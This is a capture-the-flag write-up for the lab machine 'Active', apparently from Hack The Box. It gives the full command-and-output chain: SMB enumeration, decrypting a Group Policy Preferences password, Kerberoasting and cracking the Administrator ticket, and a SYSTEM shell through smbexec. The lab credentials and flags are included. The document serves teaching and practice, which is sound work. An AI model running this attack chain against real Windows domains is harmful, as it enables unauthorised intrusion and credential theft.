# Active

## SYN Scan
```
nmap -sS -sV -O -p- -v -T4 -Pn -oA nmap/full_syn 10.10.10.100

PORT      STATE SERVICE       VERSION
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-04-20 01:37:01Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
49182/tcp open  msrpc         Microsoft Windows RPC

Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Anonymous RPC Login
```
$ rpcclient -U "" -N active.htb
rpcclient $>
```

## SMB Share Enumeration (anonymous)
```
smbmap.py -H 10.10.10.100 | tee smbmap.out

[+] IP: 10.10.10.100:445	Name: 10.10.10.100        	Status: Authenticated
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS
```

## Password Leakage
Found the password in `Replication` share.

```
# pwd
\active.htb\policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\Preferences\groups
# ls
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 .
drw-rw-rw-          0  Sat Jul 21 13:37:44 2018 ..
-rw-rw-rw-        533  Sat Jul 21 13:38:11 2018 Groups.xml
```

```
$ cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

```
Password: edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

### Decrypting GPP Password
https://github.com/t0thkr1s/gpp-decrypt

```
$./gpp-decrypt.py -c "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"

[ * ] Password: GPPstillStandingStrong2k18
```

## SMB Share Enumeration (svc_tgs)
```
$ cme smb active.htb -u svc_tgs -p 	 --shares
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               [+] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    445    DC               Users           READ
```

## The User Flag
```
# pwd
\svc_tgs\desktop
# ls
drw-rw-rw-          0  Sat Jul 21 18:14:42 2018 .
drw-rw-rw-          0  Sat Jul 21 18:14:42 2018 ..
-rw-rw-rw-         34  Sat Jul 21 18:14:42 2018 user.txt
```

```
$ cat user.txt        
86d67d8ba232bb6a254aa4d10159e983
```

## Kerberoasting
```
$ GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100 -request
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 22:06:40.351723  2021-01-21 19:07:03.723783             


$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$82d7a617eb796a3b02f4351e0c4156de$e82eb03e6d22299e34258ff28b85b336ce0fcb09b8fdff2448127ae424c08f1a16baecdc4f02500576b8b64de8d8a5f3cc9cd44ee71798820e4f4062c4f6f90036fe9a61f169a027bbd86c81e83adaea82dfd6ed4c96d9c7385535a8200901cbe10dfd717e2f4fcec57f601b02b6b5f1a308f32700852e008711b3aeb5da12d199458c94fd586f715dea445601cf916571b3c38e9b35caa85edd6407f22da1f4248f3b84f30e4da8c6e65a6c17e5e7d4419a7ba07fe75dc0e35d9b256a2c69cb2479f4a944a4a75f2b77d8ed952b7f57914f80c944ccb223fe2a42fe288ab5d0e137bf7440f42814e8c95c5f6c937b7de5cac3fe4e1fffb039df981f548e9573d54f0ddce09c2c243b72c5d72ee9e2d72928183162dd7de1e2f284f8eba5791a581f7f6b766140aff97487e6f56f0f443df9e5623643cb0eee0563f5ae7d04ef3462d2fcbcfa2b25cb37ce0a5bbdb60aa13a8cb8d935c589db93109227ba6c41952ec992c6cc553d99e66996ccc78cb69801ae6c7a67b3a156a1d4b7f29f77a6a5f201d43c7bf7f9df4b3f72ebe357ca87192cb716b691e4c1f6aefe3ab2a4928ae7313b99ae9deadad72d74c9fc799510b90ee71bc0410c67a7fe11f915b95f02b094e4fdeaadac6050bdee5d8ec186c07422b7dec8c06079aadd5e9a487526ea1be177c1cd6bc067a2a579756f518a93d15b93a84ab73a0aaf8b0ef7b4fac4c4430ed0104218748aa1382c7fbd41463452c01f4318c927bf3f65e97cfd376f7792d95e6c0ee58da5060d778e16d5d9fe1a8d498215f5f412b6156ecd421c180644d19a3141685a631bd6640fc5b16152dd4233a2dc19833834c4d2d9d2e77c43d2d0e25999a4060b6371c06939088d466f26b38d0704bdbfeaa2bb1ab7b2c647ffc69f97df7dd0f73b79a889dc55b92c19324491ef1f9d221b7385203256b3c804423f35fb9f772c5823f96601c0e4832b465898e1769d55a895bac695c9b4b60ea20b7fe94e3e4e610af61c657069827c9b5f849111cb03c8a0be7b3e03f792cd90368e157da6b4e04d150686f288f74ce3097f291fc522e0362be1e59a31af8d8d17d7f9bbd49065eff38bf31ce6aa7ea80efb0ccd9d1012faa61e3dc5e5fbf94dddcc30bab14741a2f0740c4fddb71f8c45dce66192f433bcf6517a2f8c52e413299aea4bc020d074850d9cf3562a59f3b077b810eb831aad2d2e9f0260cbdd6b570925061abda8bd4a1b8bd20cfb58180d9d89bf6c8f8c
```

## Privilege Escalation (administrator)
Cracked the ticket hash.

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$82d7a617eb796a3b02f4351e0c4156de$e82eb03e6d22299e34258ff28b85b336ce0fcb09b8fdff2448127ae424c08f1a16baecdc4f02500576b8b64de8d8a5f3cc9cd44ee71798820e4f4062c4f6f90036fe9a61f169a027bbd86c81e83adaea82dfd6ed4c96d9c7385535a8200901cbe10dfd717e2f4fcec57f601b02b6b5f1a308f32700852e008711b3aeb5da12d199458c94fd586f715dea445601cf916571b3c38e9b35caa85edd6407f22da1f4248f3b84f30e4da8c6e65a6c17e5e7d4419a7ba07fe75dc0e35d9b256a2c69cb2479f4a944a4a75f2b77d8ed952b7f57914f80c944ccb223fe2a42fe288ab5d0e137bf7440f42814e8c95c5f6c937b7de5cac3fe4e1fffb039df981f548e9573d54f0ddce09c2c243b72c5d72ee9e2d72928183162dd7de1e2f284f8eba5791a581f7f6b766140aff97487e6f56f0f443df9e5623643cb0eee0563f5ae7d04ef3462d2fcbcfa2b25cb37ce0a5bbdb60aa13a8cb8d935c589db93109227ba6c41952ec992c6cc553d99e66996ccc78cb69801ae6c7a67b3a156a1d4b7f29f77a6a5f201d43c7bf7f9df4b3f72ebe357ca87192cb716b691e4c1f6aefe3ab2a4928ae7313b99ae9deadad72d74c9fc799510b90ee71bc0410c67a7fe11f915b95f02b094e4fdeaadac6050bdee5d8ec186c07422b7dec8c06079aadd5e9a487526ea1be177c1cd6bc067a2a579756f518a93d15b93a84ab73a0aaf8b0ef7b4fac4c4430ed0104218748aa1382c7fbd41463452c01f4318c927bf3f65e97cfd376f7792d95e6c0ee58da5060d778e16d5d9fe1a8d498215f5f412b6156ecd421c180644d19a3141685a631bd6640fc5b16152dd4233a2dc19833834c4d2d9d2e77c43d2d0e25999a4060b6371c06939088d466f26b38d0704bdbfeaa2bb1ab7b2c647ffc69f97df7dd0f73b79a889dc55b92c19324491ef1f9d221b7385203256b3c804423f35fb9f772c5823f96601c0e4832b465898e1769d55a895bac695c9b4b60ea20b7fe94e3e4e610af61c657069827c9b5f849111cb03c8a0be7b3e03f792cd90368e157da6b4e04d150686f288f74ce3097f291fc522e0362be1e59a31af8d8d17d7f9bbd49065eff38bf31ce6aa7ea80efb0ccd9d1012faa61e3dc5e5fbf94dddcc30bab14741a2f0740c4fddb71f8c45dce66192f433bcf6517a2f8c52e413299aea4bc020d074850d9cf3562a59f3b077b810eb831aad2d2e9f0260cbdd6b570925061abda8bd4a1b8bd20cfb58180d9d89bf6c8f8c:Ticketmaster1968
```

```
$ cme smb active.htb -u administrator -p "Ticketmaster1968"  
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\administrator:Ticketmaster1968 (Pwn3d!)
```

```
$ smbexec.py active.htb/administrator:"Ticketmaster1968"@10.10.10.100    
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute

C:\Windows\system32>whoami
nt authority\system
```

## The Root Flag
```
C:\Windows\system32>type C:\users\administrator\desktop\root.txt
b5fc76d1d6b91d77b2fbf2d54d0f708b
```
